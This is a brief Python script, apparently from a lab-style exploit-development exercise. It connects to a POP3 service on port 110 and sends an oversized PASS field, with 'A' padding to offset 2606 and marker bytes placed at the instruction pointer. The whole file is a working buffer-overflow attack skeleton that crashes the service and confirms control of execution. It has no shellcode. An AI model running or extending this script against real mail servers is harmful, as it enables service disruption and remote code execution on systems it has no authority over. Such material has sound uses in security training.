#!/usr/bin/env python

import socket

# create socket --
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.0.166',110))

# buffer --
b_totlen = 2700 # payload len
e_offset = 2606 # eip

# test offsets --
buf = ""
buf += "A"*(e_offset - len(buf))
buf += "B"*4
buf += "C"*4
buf += "D"*(b_totlen - len(buf))

# here we go --
s.send('USER dirtbag' + '\r\n')
data = s.recv(1024)

s.send('PASS ' + buf + '\r\n')
data = s.recv(1024)
s.close()

